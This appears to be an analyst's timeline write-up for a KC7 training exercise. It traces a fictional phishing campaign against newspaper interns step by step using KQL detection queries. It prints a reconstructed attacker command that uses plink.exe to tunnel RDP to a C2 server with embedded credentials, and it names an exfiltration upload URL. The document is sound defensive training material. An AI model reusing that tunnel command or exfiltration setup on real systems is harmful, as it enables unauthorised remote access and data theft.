# Timeline — KC7 Case 01: A Scandal in Valdoria (Editorial Intern Phishing Campaign)
## 1/5/2024, 9:42:05 AM — Initial Suspicion
**Trigger:** Sonia Gose receives a suspicious email

**Detection Query:** 
```
Email
| where sender == "newspaper_jobs@gmail.com" and recipient == "sonia_gose@valdoriantimes.news"
```
**Observed:** Email from newspaper_jobs@gmail.com contained a suspicious link  
**Interpretation:** Sonia claims she did not click the link  
**Evidence**: E-002 – Suspicious email to Sonia Gose

## 1/5/2024, 10:23:17 AM — Link Click Confirmed
**Trigger:**  Sonia clicks phishing link
**Detection Queries:** 
```
// Get IP address of Sonia
Employees
| where name == "Sonia Gose"

// Check if Sonia clicked the link
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url contains "promotionrecruit.com"
```
**Observed:** Link led to download of Valdorian_Times_Editorial_Offer_Letter.docx  
**Evidence:** E-002 – Suspicious email to Sonia Gose

## 1/5/2024, 10:24:04 AM — Malicious File Downloaded
**Trigger:** File written to Sonia’s machine  
**Detection Query:** 
```
FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"
```
**Observed:** File created on UL0M-MACHINE  
**Interpretation:** Initial payload successfully staged

## 1/5/2024, 10:24:32 AM — Payload Activation
**Trigger:** Malicious document spawns PowerShell script  
**Detection Queries:**
```
// See what process this file created
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where process_commandline contains "Valdorian"
// Found process_name == "WINWORD.EXE"

// See if this process created other processes
ProcessEvents
| where hostname == "UL0M-MACHINE"
| where parent_process_name == "WINWORD.EXE"
// Found process_name == "hacktivist_manifesto.ps1"
```
**Observed:** WINWORD.EXE launched hacktivist_manifesto.ps1  
**Interpretation:** Script designed to invoke plink.exe for remote access  
**Evidence:** E-003 – hacktivist_manifesto.ps1

## 1/5/2024, 11:22:44 AM — Persistence Established
**Trigger:** Scheduled task created to run script hourly  
**Detection Query:** 
```
ProcessEvents
| where process_commandline contains "hacktivist_manifesto.ps1"
| where hostname == "UL0M-MACHINE"
```
**Observed:** Task created with ExecutionPolicy Bypass  
**Evidence:** E-004 – Scheduled task created

## 1/5/2024, 11:55:22 AM — Credential Discovery
**Trigger:** PowerShell script executed  
**Observed:** Command included SSH credentials; Script contained SSH username "$had0w" and password "thruthW!llS3tUfree"
**Evidence:** E-003 – hacktivist_manifesto.ps1

## 1/6/2024, 2:39:35 AM — C2 Connection Established
**Trigger:**  Remote connection initiated
**Detection Query:** 
```
ProcessEvents
| where process_commandline contains "plink.exe"
| where hostname == "UL0M-MACHINE"
```
**Observed:** plink.exe used to connect to C2 server at 136.130.190.181  
**Interpretation (analysis):** process_commandline == "plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181"
**Evidence** E-003, E-005

--- 
New information was provided: *Another suspicious email  address  `valdorias_best_recruiter@gmail.com` was seen sending emails to intern Ronnie and a few others.*

## 1/10/2024, 8:48:16 AM — Second Wave Begins
**Trigger:** Intern Ronnie got email from suspicious email `valdorias_best_recruiter@gmail.com`
**DEeection Query:**
```
Email
| where sender == "valdorias_best_recruiter@gmail.com" and recipient == "ronnie_mclovin@valdoriantimes.news"
```
**Evidence:** E-006 – Suspicious email

## 1/10/2024, 8:55:07 AM — Ronnie Clicks Link
**Trigger:** Ronnie clicks a link on email
**Detection Query:**
```
let ronnies_ip =
Employees
| where name == "Ronnie McLovin"
| distinct ip_addr;

OutboundNetworkEvents
| where src_ip in (ronnies_ip)
| where url contains "promotionrecruit.org"
```
**Observed:** Link led to download of Editorial_J0b_Openings_2024.docx  
**Evidence:** E-006

## 1/10/2024, 8:55:17 AM — File Downloaded to Ronnie’s Machine
**Trigger:** Suspicious file was downloaded to Ronnie's machine
**Detection Query:**
```
let ronnies_host =
Employees
| where name == "Ronnie McLovin"
| distinct hostname;
FileCreationEvents
| where filename == "Editorial_J0b_Openings_2024.docx"
| where hostname in (ronnies_host)
```
**Observaed:** File created on A37A-DESKTOP

## 1/10/2024, 8:55:50 AM — Payload Activation (Repeat Pattern)
**Detection queries:**
```
// See what process this file created
ProcessEvents
| where process_commandline contains "Editorial_J0b_Openings_2024.docx"
| where hostname == "A37A-DESKTOP"

// See if this process created other processes
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where parent_process_name == "WINWORD.EXE"
```
**Observed:** hacktivist_manifesto.ps1 spawned again
**Intepretation:** Same attack chain as Sonia's machine
**Evidence*:** E-007

## 1/11/2024, 3:08:12 AM — Ronnie’s Machine Connects to C2

**Detection Query:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "plink.exe"
```
**Observed:** Remote access established via second C2 server  
**Evidence:** E-007

---

## 1/31/2024, 9:47:51 AM — Fakestory.docx Discovered
**Trigger:** "My investigative buddy, who was also looking at Ronnie's machine, saw a weird file `fakestory.docx` being downloaded from a suspicious domain"
**Detection Query:** 
```
llet ronnies_ip =
Employees
| where name == "Ronnie McLovin"
| distinct ip_addr;

OutboundNetworkEvents
| where src_ip in (ronnies_ip)
| where url contains "fakestory.docx"

FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "fakestory.docx"
```
**Observed:** Downloaded from hire-recruit.org  
**Evidence:** E-008

## 1/31/2024, 10:26:20 AM — File Renamed and Relocated

**Detection Query:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "fakestory.docx"
```
**Observed:** Renamed to OpEdFinal_to_print.docx 
**Location:** C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
**Evidence** E-008

## 1/31/2024, 11:11:12 AM — Clark Kent Receives Final Print
**Action:** Clark Kent got email with fake final print
**Tool/Command:** 
```
Email
| where sender == "ronnie_mclovin@valdoriantimes.news" and recipient == "clark_kent@valdoriantimes.news"
| where link contains "OpEdFinal_to_print.docx"
```
**Observed:** Email sent from Ronnie to Clark
**Evidence** E-001

---
In the middle of your investigation, `Ronnie` finds you and shows you an alert ([[E-009 - Dark Web Monitoring Alert]]) she received from her dark web monitoring service.

## 1/31/2024, 11:44:58 AM — Dark Web Alert + Archiving Begins
**Detection Query:** 
```
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains ".7z"
```
**Observed:**  All .docx files compressed using .7z and archived
**Interpretation:** Indicates preparation for data exfiltration—.7z is commonly used to compress and encrypt sensitive files before transfer  
**Evidence:** E-009, E-010

## 2/1/2024, 2:15:01 AM — Exfiltration to Attacker Portal
**Detection Query:** 
```
ProcessEvents
| where process_commandline contains "hirejob.com"
```
**Observed:** Files were uploaded to https://hirejob.com/exfil_processor/upload.php  
**Interpretation:** Final stage of attack—data exfiltration confirmed via custom portal  
**Evidence:** E-010